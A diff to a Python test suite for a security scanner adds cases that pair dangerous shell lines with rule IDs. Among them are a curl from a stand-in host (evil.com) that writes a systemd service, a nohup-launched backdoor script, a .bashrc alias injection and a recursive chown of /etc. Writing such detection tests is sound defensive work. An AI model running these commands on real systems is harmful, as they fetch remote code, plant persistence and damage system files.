@@ -157,6 +157,11 @@ class TestSafetyChecks:
             ("docker run --privileged image\n", "SEC-033"),
             ("pickle.loads(data)\n", "SEC-034"),
             ("IFS=, read -ra parts\n", "SEC-035"),
+            ("chown -R root:root /etc\n", "SEC-036"),
+            ("curl http://evil.com/svc -o /etc/systemd/system/x.service\n", "SEC-037"),
+            ("find /tmp -name *.tmp -delete\n", "SEC-038"),
+            ("nohup ./backdoor.sh &\n", "SEC-039"),
+            ("echo alias evil=rm >> ~/.bashrc\n", "SEC-040"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
